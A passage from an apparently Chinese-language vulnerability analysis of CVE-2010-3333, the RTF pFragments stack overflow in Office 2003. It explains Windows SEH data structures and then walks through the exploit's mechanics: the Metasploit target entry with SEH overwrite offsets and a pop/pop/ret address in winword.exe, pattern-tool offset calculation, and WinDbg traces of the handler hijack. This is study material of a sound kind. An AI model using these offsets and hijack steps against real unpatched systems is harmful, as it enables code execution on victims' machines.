指向异常处理链表</span></span><br><span class="line">    PVOID StackBase;            <span class="comment">// 当前线程所使用的栈的栈底</span></span><br><span class="line">    PVOID StackLimit;           <span class="comment">// 当前线程所使用的栈的栈顶</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span> <span class="comment">// 指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;虽然<code>Windows</code>系统经历了多次<code>更新换代</code>，但是从<code>Windows 2000</code>到<code>Windows 10</code>，<code>TIB</code>的结构变化很小。其中，与异常处理相关的项是指向<code>EXCEPTION_REGISTRATION_RECORD</code>结构的<code>指针ExceptionList</code>，它位于<code>TIB</code>的<code>偏移0处</code>，同时在<code>TEB</code>的<code>偏移0处</code>。在<code>x86平台</code>的<code>用户模式</code>下，Windows将<code>FS段选择器</code>指向<code>当前线程的TEB数据</code>，即<code>TEB</code>总是由<code>fs:[0]</code>指向的(在<code>x64平台</code>上，这个关系变成了<code>gs:[0]</code>)。</p><h5 id="2-2、-EXCEPTION-REGISTRATION-RECORD结构"><a href="#2-2、-EXCEPTION-REGISTRATION-RECORD结构" class="headerlink" title="2.2、_EXCEPTION_REGISTRATION_RECORD结构"></a>2.2、_EXCEPTION_REGISTRATION_RECORD结构</h5><p>&emsp;&emsp;TEB(或TIB)偏移量为0的_EXCEPTION_REGISTRATION_RECORD主要是用于描述线程异常处理过程的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系，其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span>    <span class="comment">// 指向下一个_EXCEPTION_REGISTRATION_RECORD结构的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;                     <span class="comment">// 当前异常处理回调函数的地址</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;其中，<code>“Next”</code>是指向下一个<code>_EXCEPTION_REGISTRATION_RECORD</code>结构(简称:<code>“ERR”</code>)的指针,形成一<code>链状结构</code>，而<code>链表头</code>就存放在<code>fs:[0]</code>指向的<code>TEB(或TIB)</code>中；<code>“Handler”</code>指向<code>异常处理回调函数</code>。当程序运行过程中产生异常时，系统的<code>异常分发器</code>就会从<code>fs:[0]</code>处取得<code>异常处理的链表头</code>，然后查找<code>异常处理链表</code>并依次调用<code>各个链表节点</code>中的<code>异常处理回调函数</code>。由于<code>TEB</code>是线程的<code>私有数据结构</code>，相应的，<code>每个线程</code>也都有自己的<code>异常处理链表</code>，即<code>SEH机制</code>的<code>作用范围</code>仅限于<code>当前线程</code>。从<code>数据结构</code>的角度来讲，<code>SEH链</code>就是一个只允许在<code>链表头部</code>进行<code>增加</code>和<code>删除</code>节点操作的<code>单向链表</code>，且<code>链表头部</code>永远保存在<code>fs:[0]</code>指向的<code>TEB(或TIB)</code>中。</p><p>&emsp;&emsp;下图就是<code>SEH异常处理链表</code>的示意图：<br><img src="/resources/2020/CVE-2010-3333/SEH异常处理链表示意图.png" alt="SEH异常处理链表示意图"></p><h5 id="2-3、-EXCEPTION-RECORD结构"><a href="#2-3、-EXCEPTION-RECORD结构" class="headerlink" title="2.3、_EXCEPTION_RECORD结构"></a>2.3、_EXCEPTION_RECORD结构</h5><p>&emsp;&emsp;各个<code>异常处理函数</code>除了针对<code>本异常的特定处理</code>之外，通常会将<code>异常信息</code>进行封装，以便进行后续处理。<code>封装异常信息</code>的结构就是<code>_EXCEPTION_RECORD</code>，该结构定义如下(<code>winnt.h</code>)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;                         <span class="comment">// 异常代码</span></span><br><span class="line">    DWORD ExceptionFlags;                           <span class="comment">// 异常标志</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span>      <span class="comment">// 指向另一个EXCEPTION_RECORD的指针</span></span><br><span class="line">    PVOID ExceptionAddress;                         <span class="comment">// 异常发生的地址</span></span><br><span class="line">    DWORD NumberParameters;                         <span class="comment">// 下面的ExceptionInformation含有的元素数目</span></span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];   <span class="comment">// 附加信息</span></span><br><span class="line">    &#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p><strong><code>常见的异常产生原因：</code></strong></p><table><thead><tr><th style="text-align:left">异常产生原因</th><th style="text-align:center">对应值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">STATUS_GUARD_PAGE_VIOLATION</td><td style="text-align:center">080000001h</td><td style="text-align:left">读写属性为PAGE_GUARD的页面</td></tr><tr><td style="text-align:left">EXCEPTION_BREAKPOINT</td><td style="text-align:center">080000003h</td><td style="text-align:left">断点异常</td></tr><tr><td style="text-align:left">EXCEPTION_SINGLE_STEP</td><td style="text-align:center">080000004h</td><td style="text-align:left">单步中断</td></tr><tr><td style="text-align:left">EXCEPTION_INVALID_HANDLE</td><td style="text-align:center">0C0000008h</td><td style="text-align:left">向一个函数传递了一个无效句柄</td></tr><tr><td style="text-align:left">EXCEPTION_INVALID_VIOLATION</td><td style="text-align:center">0C0000005h</td><td style="text-align:left">读写内存违规</td></tr><tr><td style="text-align:left">EXCEPTION_ILLEGAL_INSTRUCTION</td><td style="text-align:center">0C000001Dh</td><td style="text-align:left">遇到无效指令</td></tr><tr><td style="text-align:left">EXCEPTION_IN_PAGE_ERROR</td><td style="text-align:center">0C0000006h</td><td style="text-align:left">存取不存在的页面</td></tr><tr><td style="text-align:left">EXCEPTION_INT_DIVIDE_BY_ZERO</td><td style="text-align:center">0C0000094h</td><td style="text-align:left">除0错误</td></tr><tr><td style="text-align:left">EXCEPTION_STACK_OVERFLOW</td><td style="text-align:center">0C00000FDh</td><td style="text-align:left">栈溢出</td></tr></tbody></table><h5 id="2-4、-CONTEXT结构"><a href="#2-4、-CONTEXT结构" class="headerlink" title="2.4、_CONTEXT结构"></a>2.4、_CONTEXT结构</h5><p>&emsp;&emsp;<code>异常处理函数</code>除了将一部分异常信息封装成<code>_EXCEPTION_RECORD</code>，还将另一部分异常信息封装成<code>陷阱帧</code>，它精确描述了发生异常时<code>线程的状态</code>(Windows的<code>任务调度</code>是基于<code>线程</code>的)。该结构与<code>处理器</code>高度相关，因此在不同的平台上(<code>Intel x86/x64</code>、<code>MIPS</code>、<code>Alpha</code>和<code>PowerPC</code>处理器等)有不同的定义。其结构中包含<code>每个寄存器的状态</code>，但该结构一般仅供<code>系统内核自身</code>或者<code>调试系统</code>使用。当需要把控制权交给<code>用户注册</code>的<code>异常处理程序</code>时，会将<code>上述结构</code>转换成一个名为<code>CONTEXT的结构</code>，它包含线程运行时处理器<code>各主要寄存器的完整镜像</code>，用于保存<code>线程运行环境</code>。</p><p>&emsp;&emsp;<code>x86平台</code>上的<code>CONTEXT结构</code>如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span></span><br><span class="line">    <span class="comment">// 标志位，表示整个结构中哪些部分是有效的</span></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_DEBUG_REGISTERS时，以下部分有效</span></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_FLOATING_POINT时，以下部分有效</span></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_SEGMENTS时，以下部分有效</span></span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_INTEGER时，以下部分有效</span></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_CONTROL时，以下部分有效</span></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;</span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_EXTENDED_REGISTERS时，以下部分有效</span></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;该结构的大部分是<code>不言自明</code>的。需要解释的是，其第一个域<code>ContextFlags</code>表示该结构中<code>哪些域有效</code>，当需要<code>CONTEXT结构</code>保存的信息<code>恢复执行</code>时可对应更新，这为<code>有选择的更新部分域</code>而非全部域提供了有效的手段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_i386    0x00010000L    <span class="comment">// 这假设i386和i486具有相同的上下文记录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_i486    0x00010000L    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_CONTROL             (CONTEXT_i386 | 0x00000001L) <span class="comment">// 控制寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_INTEGER             (CONTEXT_i386 | 0x00000002L) <span class="comment">// (整数)通用寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_SEGMENTS            (CONTEXT_i386 | 0x00000004L) <span class="comment">// 段寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_FLOATING_POINT      (CONTEXT_i386 | 0x00000008L) <span class="comment">// 浮点寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_DEBUG_REGISTERS     (CONTEXT_i386 | 0x00000010L) <span class="comment">// 调试寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_EXTENDED_REGISTERS  (CONTEXT_i386 | 0x00000020L) <span class="comment">// 扩展寄存器</span></span></span><br></pre></td></tr></table></figure><h5 id="2-5、-EXCEPTION-POINTERS结构"><a href="#2-5、-EXCEPTION-POINTERS结构" class="headerlink" title="2.5、_EXCEPTION_POINTERS结构"></a>2.5、_EXCEPTION_POINTERS结构</h5><p>&emsp;&emsp;当一个<code>异常</code>发生时，在没有<code>调试器</code>干预的情况下，操作系统会将<code>异常信息</code>转交给<code>用户态的异常处理过程</code>。实际上，由于<code>同一个线程</code>在<code>用户态</code>和<code>内核态</code>使用的是<code>两个不同的栈</code>，为了让<code>用户态的异常处理程序</code>能够访问<code>与异常相关的数据</code>，操作系统必须把与<code>本次异常</code>相关联的<code>_EXCEPTION_RECORD结构</code>和<code>_CONTEXT结构</code>放到<code>用户栈</code>中，同时在栈上放置一个<code>_EXCEPTION_POINTERS结构</code>，它包含<code>两个指针</code>，一个指向<code>_EXCEPTION_RECORD结构</code>，另一个指向<code>_CONTEXT结构</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_POINTERS</span> &#123;</span></span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;            <span class="comment">// _EXCEPTION_RECORD结构指针</span></span><br><span class="line">  PCONTEXT          ContextRecord;              <span class="comment">// _CONTEXT结构指针</span></span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure><h4 id="3、计算偏移量"><a href="#3、计算偏移量" class="headerlink" title="3、计算偏移量"></a>3、计算偏移量</h4><p><strong><code>环境：</code></strong>XP &amp; Office2003</p><p>&emsp;&emsp;既然我们要覆盖<code>SEH记录</code>，就要搞清楚，<code>覆盖</code>栈数据之前，栈上有<code>哪些SEH记录</code>，以及<code>它们的位置</code>。在复制<code>pFragments属性数据</code>到栈上之前，栈上的<code>SEH记录</code>如下(CVE-2010-3333(target6,Crash).rtf)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">                       +----------+</span><br><span class="line">fs:[0] ---&gt; 0x0012FFB0 | 0012FFE0 |--+ 指向下一个SEH记录的指针</span><br><span class="line">                       +----------+  | </span><br><span class="line">            0x0012FFB4 | 30AA1ABC |  | SE处理程序</span><br><span class="line">                       +----------+  |</span><br><span class="line">                       |          |  |</span><br><span class="line">               ......  |  ......  |  |</span><br><span class="line">                       |          |  |</span><br><span class="line">                       +----------+  |</span><br><span class="line">            0x0012FFE0 | FFFFFFFF |&lt;-+ SEH链尾部</span><br><span class="line">                       +----------+</span><br><span class="line">            0x0012FFE4 | 7C839AB0 |    SE处理程序</span><br><span class="line">                       +----------+</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Office v11.8307.8324, winword.exe v11.0.8307.0</span><br><span class="line"># Office v11.8328.8221, winword.exe v11.0.8328.0</span><br><span class="line">[ &apos;Microsoft Office 2003 SP3 English on Windows XP SP3 English&apos;,</span><br><span class="line">    &#123;</span><br><span class="line">        &apos;Offsets&apos; =&gt; [ 24580, 51156 ],</span><br><span class="line">        &apos;Ret&apos; =&gt; 0x30001bdd # p/p/r in winword.exe</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">0x001237DC pFragments缓冲区起始地址</span><br><span class="line">......</span><br><span class="line">0x001297E0 0x6E46336E 并不是SEH记录(0x001297E0-0x001237DC=24580)</span><br><span class="line">......</span><br><span class="line">0x0012FFB0 0x4E32704E SEH记录(0x0012FFB0-0x001237DC=51156)</span><br><span class="line">......</span><br><span class="line">0x0012FFE0 0x4E38714E SEH链尾部</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到在<code>Metasploit</code>的<code>生成样本</code>的脚本中，当前所<code>使用的环境</code>对应的<code>Target</code>中，有<code>两个偏移</code>，<code>51156</code>正是当前<code>SEH链表</code>的<code>第1个SEH记录(0x0012FFB0)</code>距pFragments缓冲区起始地址(<code>0x001237DC</code>)的偏移，而<code>24580</code>所对应的<code>栈数据</code>并不是<code>SEH链表</code>中的<code>SEH记录</code>，不太清楚为什么，实际<code>控制流劫持</code>过程中也<code>没用到</code>此处的数据。</p><p>&emsp;&emsp;覆盖栈数据<code>之后</code>，原本的SEH链表<code>被覆盖</code>，<code>覆盖之后</code>的<code>SEH链表</code>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                       +----------+</span><br><span class="line">fs:[0] ---&gt; 0x0012FFB0 | 4E32704E |    指向下一个SEH记录的指针</span><br><span class="line">                       +----------+   </span><br><span class="line">            0x0012FFB4 | 704E3370 |    SE处理程序</span><br><span class="line">                       +----------+  </span><br><span class="line">                       |          |  </span><br><span class="line">               ......  |  ......  |  </span><br><span class="line">                       |          |  </span><br><span class="line">                       +----------+   </span><br><span class="line">            0x0012FFE0 | 4E38714E |    SEH链尾部</span><br><span class="line">                       +----------+</span><br><span class="line">            0x0012FFE4 | 724E3971 |    SE处理程序</span><br><span class="line">                       +----------+</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在这里<code>计算偏移量</code>时，有<code>两种方法</code>。<code>方法一</code>，手算，只要知道<code>缓冲区的起始地址</code>以及<code>SEH记录的位置</code>就可以算出偏移。<code>方法二</code>，使用<code>Metasploit</code>提供的两个工具，<code>pattern_creat.rb</code>和<code>pattern_offset.rb</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 65600</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9</span><br><span class="line">.......</span><br><span class="line">6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 6E46336E -l 65600 </span></span><br><span class="line">[*] Exact match at offset 4300</span><br><span class="line">[*] Exact match at offset 24580 &lt;----</span><br><span class="line">[*] Exact match at offset 44860</span><br><span class="line">[*] Exact match at offset 65140</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 4E32704E -l 65600 </span></span><br><span class="line">[*] Exact match at offset 10596</span><br><span class="line">[*] Exact match at offset 30876</span><br><span class="line">[*] Exact match at offset 51156 &lt;----</span><br></pre></td></tr></table></figure><h4 id="4、SEH劫持过程分析"><a href="#4、SEH劫持过程分析" class="headerlink" title="4、SEH劫持过程分析"></a>4、SEH劫持过程分析</h4><p><strong><code>环境：</code></strong>XP &amp; Office2003</p><p>&emsp;&emsp;通过<code>msf</code>生成样本的脚本可知，<code>当前环境</code>所使用的用于<code>覆盖SEH处理程序地址</code>的地址为<code>0x30001bdd</code>，其位于<code>winword.exe</code>。我们使用<code>WinDbg</code>对<code>CVE-2010-3333(target2,calc).rtf</code>进行调试，首先对地址<code>0x30001bdd</code>下一个断点，然后查看<code>栈回溯</code>，通过栈回溯了解<code>SEH劫持的过程</code>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">908.</span>acc): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffdb000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=0387ffcc <span class="built_in">ebp</span>=0387fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; <span class="built_in">bp</span> <span class="number">0x30001bdd</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\WINWORD.EXE - </span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06420000</span> 065c1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\NETAPI32.dll</span><br><span class="line">(<span class="number">908.</span>3d4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; gn</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdd <span class="built_in">esp</span>=001233e4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdd</span>:</span><br><span class="line">30001bdd <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line"><span class="number">00123404</span> 7c92327a 001234cc 0012ffb0 001234e8 WINWORD+<span class="number">0x1bdd</span>(<span class="number">0x30001bdd</span>,当前指令地址)</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001234b4 7c92e46a <span class="number">00000000</span> 001234e8 001234cc ntdll!ExecuteHandler+<span class="number">0x24</span>(<span class="number">0x7c92327a</span>)[ntdll!ExecuteHandler2 (7c923282)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001234b4 30ed442c <span class="number">00000000</span> 001234e8 001234cc ntdll!KiUserExceptionDispatcher+<span class="number">0xe</span>(<span class="number">0x7c92e46a</span>)[ntdll!RtlDispatchException (7c94a950)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001237ec 42030f42 2ac372e9 d32cf01d 36a595dd 